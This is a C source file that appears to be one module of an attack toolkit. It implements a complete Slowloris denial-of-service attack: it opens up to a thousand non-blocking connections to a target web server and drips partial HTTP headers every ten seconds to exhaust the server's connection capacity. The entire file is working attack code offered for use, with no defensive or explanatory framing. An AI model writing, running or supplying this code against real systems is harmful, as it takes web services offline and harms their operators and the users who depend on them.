/**
 * @file slowloris.c
 * @brief Slowloris attack - Keep HTTP connections open and server resources
 * exhausted
 *
 * This attack opens many connections to the target server and sends partial
 * HTTP requests slowly to keep connections open as long as possible.
 */

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#include "../common/logger.h"

#define SLOWLORIS_MAX_CONNECTIONS 1000
#define SLOWLORIS_SEND_INTERVAL 10 // seconds between header sends
#define SLOWLORIS_MAX_EVENTS 100

typedef struct {
  int fd;
  struct sockaddr_in target;
  time_t last_send;
  int headers_sent;
  bool connected;
} slowloris_connection_t;

typedef struct {
  slowloris_connection_t *connections;
  size_t max_connections;
  size_t active_connections;
  int epoll_fd;
  struct sockaddr_in target;
  uint64_t total_headers_sent;
  bool running;
} slowloris_context_t;

static int slowloris_create_connection(slowloris_context_t *ctx) {
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0) {
    log_error("Failed to create socket: %s", strerror(errno));
    return -1;
  }

  // Set non-blocking
  int flags = fcntl(sock, F_GETFL, 0);
  fcntl(sock, F_SETFL, flags | O_NONBLOCK);

  // Set socket options
  int opt = 1;
  setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

  // Connect (will return EINPROGRESS for non-blocking)
  int result =
      connect(sock, (struct sockaddr *)&ctx->target, sizeof(ctx->target));

  if (result < 0 && errno != EINPROGRESS) {
    log_error("Connect failed: %s", strerror(errno));
    close(sock);
    return -1;
  }

  // Add to epoll
  struct epoll_event ev;
  ev.events = EPOLLOUT | EPOLLIN;
  ev.data.fd = sock;

  if (epoll_ctl(ctx->epoll_fd, EPOLL_CTL_ADD, sock, &ev) < 0) {
    log_error("epoll_ctl failed: %s", strerror(errno));
    close(sock);
    return -1;
  }

  return sock;
}

static int slowloris_send_partial_header(int sock, int header_num) {
  const char *headers[] = {
      "GET /%s HTTP/1.1\r\n",
      "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n",
      "Accept: text/html,application/xhtml+xml\r\n",
      "Accept-Language: en-US,en;q=0.5\r\n",
      "Accept-Encoding: gzip, deflate\r\n",
      "Connection: keep-alive\r\n",
      "X-Custom-Header-%d: %d\r\n" // Padding headers
  };

  char buffer[256];

  if (header_num == 0) {
    // Send initial request line with random path
    snprintf(buffer, sizeof(buffer), headers[0],
             rand() % 1000 ? "index.html" : "nonexistent.php");
  } else if (header_num < 6) {
    // Send standard headers
    snprintf(buffer, sizeof(buffer), "%s", headers[header_num]);
  } else {
    // Send padding headers to keep connection alive
    snprintf(buffer, sizeof(buffer), headers[6], header_num, rand());
  }

  ssize_t sent = send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);

  if (sent < 0) {
    if (errno == EAGAIN || errno == EWOULDBLOCK) {
      return 0; // Would block, try later
    }
    return -1; // Error
  }

  return sent;
}

void *attack_slowloris(void *arg) {
  struct sockaddr_in *target = (struct sockaddr_in *)arg;

  log_info("Starting Slowloris attack on %s:%d", inet_ntoa(target->sin_addr),
           ntohs(target->sin_port));

  // Initialize context
  slowloris_context_t ctx = {0};
  ctx.max_connections = SLOWLORIS_MAX_CONNECTIONS;
  ctx.target = *target;
  ctx.running = true;

  ctx.connections = calloc(ctx.max_connections, sizeof(slowloris_connection_t));
  if (ctx.connections == NULL) {
    log_error("Failed to allocate connections");
    return NULL;
  }

  // Create epoll
  ctx.epoll_fd = epoll_create1(0);
  if (ctx.epoll_fd < 0) {
    log_error("epoll_create1 failed: %s", strerror(errno));
    free(ctx.connections);
    return NULL;
  }

  // Initialize connections
  for (size_t i = 0; i < ctx.max_connections; i++) {
    ctx.connections[i].fd = -1;
  }

  struct epoll_event events[SLOWLORIS_MAX_EVENTS];
  time_t last_connection_attempt = 0;

  while (ctx.running) {
    time_t now = time(NULL);

    // Try to create new connections
    if (now > last_connection_attempt) {
      for (size_t i = 0; i < ctx.max_connections; i++) {
        if (ctx.connections[i].fd == -1) {
          int sock = slowloris_create_connection(&ctx);
          if (sock >= 0) {
            ctx.connections[i].fd = sock;
            ctx.connections[i].target = ctx.target;
            ctx.connections[i].last_send = now;
            ctx.connections[i].headers_sent = 0;
            ctx.connections[i].connected = false;
            ctx.active_connections++;
          }
          break; // Only create one per iteration
        }
      }
      last_connection_attempt = now;
    }

    // Wait for events
    int nfds = epoll_wait(ctx.epoll_fd, events, SLOWLORIS_MAX_EVENTS, 1000);

    for (int i = 0; i < nfds; i++) {
      int sock = events[i].data.fd;

      // Find connection
      slowloris_connection_t *conn = NULL;
      for (size_t j = 0; j < ctx.max_connections; j++) {
        if (ctx.connections[j].fd == sock) {
          conn = &ctx.connections[j];
          break;
        }
      }

      if (conn == NULL)
        continue;

      // Check for errors
      if (events[i].events & (EPOLLERR | EPOLLHUP)) {
        log_debug("Connection error on fd %d", sock);
        epoll_ctl(ctx.epoll_fd, EPOLL_CTL_DEL, sock, NULL);
        close(sock);
        conn->fd = -1;
        ctx.active_connections--;
        continue;
      }

      // Connection established
      if (events[i].events & EPOLLOUT && !conn->connected) {
        conn->connected = true;
        log_debug("Connection established: fd %d", sock);
      }

      // Send partial headers periodically
      if (conn->connected &&
          (now - conn->last_send) >= SLOWLORIS_SEND_INTERVAL) {
        int result = slowloris_send_partial_header(sock, conn->headers_sent);

        if (result > 0) {
          conn->headers_sent++;
          conn->last_send = now;
          ctx.total_headers_sent++;

          log_debug("Sent header #%d on fd %d", conn->headers_sent, sock);
        } else if (result < 0) {
          // Connection died, close it
          epoll_ctl(ctx.epoll_fd, EPOLL_CTL_DEL, sock, NULL);
          close(sock);
          conn->fd = -1;
          ctx.active_connections--;
        }
      }
    }

    // Log statistics
    if (now % 10 == 0) {
      log_info("Slowloris: %zu active connections, %lu total headers sent",
               ctx.active_connections, ctx.total_headers_sent);
    }
  }

  // Cleanup
  for (size_t i = 0; i < ctx.max_connections; i++) {
    if (ctx.connections[i].fd >= 0) {
      close(ctx.connections[i].fd);
    }
  }

  close(ctx.epoll_fd);
  free(ctx.connections);

  log_info("Slowloris attack completed");

  return NULL;
}
